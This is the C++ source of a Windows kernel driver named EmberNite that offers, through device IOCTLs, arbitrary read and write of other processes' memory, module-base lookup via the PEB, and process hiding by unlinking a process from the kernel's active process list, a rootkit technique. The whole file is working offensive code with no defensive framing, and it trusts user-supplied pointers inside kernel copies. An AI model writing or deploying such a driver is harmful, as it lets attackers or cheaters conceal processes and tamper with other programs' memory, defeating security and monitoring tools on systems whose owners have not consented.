// ember_driver.cpp
// kernel driver for memory read/write and process hiding
// compile with WDK, target x64

#include <ntddk.h>
#include <ntstrsafe.h>

#define DEVICE_NAME     L"\\Device\\EmberNite"
#define SYMLINK_NAME    L"\\DosDevices\\EmberNite"
#define IOCTL_READ      CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_WRITE     CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_HIDE_PROC CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_GET_BASE  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct _MEMORY_REQUEST {
    ULONG_PTR process_id;
    ULONG_PTR address;
    ULONG_PTR size;
    PVOID buffer;
} MEMORY_REQUEST, *PMEMORY_REQUEST;

typedef struct _BASE_REQUEST {
    ULONG_PTR process_id;
    ULONG_PTR base_address;
} BASE_REQUEST, *PBASE_REQUEST;

UNICODE_STRING g_device_name;
UNICODE_STRING g_symlink_name;
PDEVICE_OBJECT g_device_object = NULL;

// ---------------------------------------------------------------------------
// process hiding via DKOM (direct kernel object manipulation)
// removes process from eprocess active list
// ---------------------------------------------------------------------------
NTSTATUS HideProcess(ULONG_PTR pid) {
    PEPROCESS target = NULL;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)pid, &target);
    if (!NT_SUCCESS(status)) return status;

    PLIST_ENTRY active_list = (PLIST_ENTRY)((PUCHAR)target + 0x448); // eprocess offset
    if (active_list->Flink && active_list->Blink) {
        active_list->Blink->Flink = active_list->Flink;
        active_list->Flink->Blink = active_list->Blink;
        active_list->Flink = active_list;
        active_list->Blink = active_list;
    }

    ObDereferenceObject(target);
    return STATUS_SUCCESS;
}

// ---------------------------------------------------------------------------
// kernel read through direct memory access
// ---------------------------------------------------------------------------
NTSTATUS KernelRead(ULONG_PTR pid, ULONG_PTR address, PVOID buffer, ULONG_PTR size) {
    PEPROCESS target = NULL;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)pid, &target);
    if (!NT_SUCCESS(status)) return status;

    KAPC_STATE apc_state;
    KeStackAttachProcess(target, &apc_state);

    __try {
        if (!MmIsAddressValid((PVOID)address)) {
            KeUnstackDetachProcess(&apc_state);
            ObDereferenceObject(target);
            return STATUS_INVALID_ADDRESS;
        }
        RtlCopyMemory(buffer, (PVOID)address, size);
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        KeUnstackDetachProcess(&apc_state);
        ObDereferenceObject(target);
        return STATUS_ACCESS_VIOLATION;
    }

    KeUnstackDetachProcess(&apc_state);
    ObDereferenceObject(target);
    return STATUS_SUCCESS;
}

// ---------------------------------------------------------------------------
// kernel write through mdl
// ---------------------------------------------------------------------------
NTSTATUS KernelWrite(ULONG_PTR pid, ULONG_PTR address, PVOID buffer, ULONG_PTR size) {
    PEPROCESS target = NULL;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)pid, &target);
    if (!NT_SUCCESS(status)) return status;

    KAPC_STATE apc_state;
    KeStackAttachProcess(target, &apc_state);

    PMDL mdl = IoAllocateMdl((PVOID)address, (ULONG)size, FALSE, FALSE, NULL);
    if (!mdl) {
        KeUnstackDetachProcess(&apc_state);
        ObDereferenceObject(target);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    __try {
        MmProbeAndLockPages(mdl, KernelMode, IoModifyAccess);
        PVOID mapped = MmGetSystemAddressForMdlSafe(mdl, NormalPagePriority);
        if (!mapped) {
            MmUnlockPages(mdl);
            IoFreeMdl(mdl);
            KeUnstackDetachProcess(&apc_state);
            ObDereferenceObject(target);
            return STATUS_INSUFFICIENT_RESOURCES;
        }
        RtlCopyMemory(mapped, buffer, size);
        MmUnlockPages(mdl);
    }
    __except(EXCEPTION_EXECUTE_HANDLER) {
        IoFreeMdl(mdl);
        KeUnstackDetachProcess(&apc_state);
        ObDereferenceObject(target);
        return STATUS_ACCESS_VIOLATION;
    }

    IoFreeMdl(mdl);
    KeUnstackDetachProcess(&apc_state);
    ObDereferenceObject(target);
    return STATUS_SUCCESS;
}

// ---------------------------------------------------------------------------
// get module base via peb
// ---------------------------------------------------------------------------
NTSTATUS GetModuleBase(ULONG_PTR pid, ULONG_PTR* base) {
    PEPROCESS target = NULL;
    NTSTATUS status = PsLookupProcessByProcessId((HANDLE)pid, &target);
    if (!NT_SUCCESS(status)) return status;

    ULONG_PTR peb = *(ULONG_PTR*)((PUCHAR)target + 0x550); // eprocess peb offset
    if (!peb) {
        ObDereferenceObject(target);
        return STATUS_NOT_FOUND;
    }

    ULONG_PTR loader_data = 0;
    KernelRead(pid, peb + 0x18, &loader_data, sizeof(loader_data)); // peb loader data
    if (!loader_data) {
        ObDereferenceObject(target);
        return STATUS_NOT_FOUND;
    }

    ULONG_PTR module_list = loader_data + 0x10;
    ULONG_PTR first_module = 0;
    KernelRead(pid, module_list, &first_module, sizeof(first_module));

    *base = first_module;
    ObDereferenceObject(target);
    return STATUS_SUCCESS;
}

// ---------------------------------------------------------------------------
// irp dispatch
// ---------------------------------------------------------------------------
NTSTATUS DispatchCreate(PDEVICE_OBJECT device, PIRP irp) {
    UNREFERENCED_PARAMETER(device);
    irp->IoStatus.Status = STATUS_SUCCESS;
    irp->IoStatus.Information = 0;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS DispatchClose(PDEVICE_OBJECT device, PIRP irp) {
    UNREFERENCED_PARAMETER(device);
    irp->IoStatus.Status = STATUS_SUCCESS;
    irp->IoStatus.Information = 0;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}

NTSTATUS DispatchControl(PDEVICE_OBJECT device, PIRP irp) {
    UNREFERENCED_PARAMETER(device);
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(irp);
    NTSTATUS status = STATUS_SUCCESS;
    ULONG_PTR info = 0;

    switch (stack->Parameters.DeviceIoControl.IoControlCode) {
        case IOCTL_READ: {
            PMEMORY_REQUEST req = (PMEMORY_REQUEST)irp->AssociatedIrp.SystemBuffer;
            status = KernelRead(req->process_id, req->address, req->buffer, req->size);
            info = sizeof(MEMORY_REQUEST);
            break;
        }
        case IOCTL_WRITE: {
            PMEMORY_REQUEST req = (PMEMORY_REQUEST)irp->AssociatedIrp.SystemBuffer;
            status = KernelWrite(req->process_id, req->address, req->buffer, req->size);
            info = sizeof(MEMORY_REQUEST);
            break;
        }
        case IOCTL_HIDE_PROC: {
            ULONG_PTR* pid = (ULONG_PTR*)irp->AssociatedIrp.SystemBuffer;
            status = HideProcess(*pid);
            info = sizeof(ULONG_PTR);
            break;
        }
        case IOCTL_GET_BASE: {
            PBASE_REQUEST req = (PBASE_REQUEST)irp->AssociatedIrp.SystemBuffer;
            status = GetModuleBase(req->process_id, &req->base_address);
            info = sizeof(BASE_REQUEST);
            break;
        }
        default:
            status = STATUS_INVALID_DEVICE_REQUEST;
            break;
    }

    irp->IoStatus.Status = status;
    irp->IoStatus.Information = info;
    IoCompleteRequest(irp, IO_NO_INCREMENT);
    return status;
}

// ---------------------------------------------------------------------------
// driver entry / unload
// ---------------------------------------------------------------------------
VOID DriverUnload(PDRIVER_OBJECT driver) {
    IoDeleteSymbolicLink(&g_symlink_name);
    IoDeleteDevice(g_device_object);
    DbgPrint("[EmberNite] driver unloaded\n");
}

NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING registry_path) {
    UNREFERENCED_PARAMETER(registry_path);

    RtlInitUnicodeString(&g_device_name, DEVICE_NAME);
    RtlInitUnicodeString(&g_symlink_name, SYMLINK_NAME);

    NTSTATUS status = IoCreateDevice(driver, 0, &g_device_name, FILE_DEVICE_UNKNOWN,
                                      FILE_DEVICE_SECURE_OPEN, FALSE, &g_device_object);
    if (!NT_SUCCESS(status)) return status;

    status = IoCreateSymbolicLink(&g_symlink_name, &g_device_name);
    if (!NT_SUCCESS(status)) {
        IoDeleteDevice(g_device_object);
        return status;
    }

    driver->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;
    driver->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;
    driver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchControl;
    driver->DriverUnload = DriverUnload;

    DbgPrint("[EmberNite] driver loaded\n");
    return STATUS_SUCCESS;
}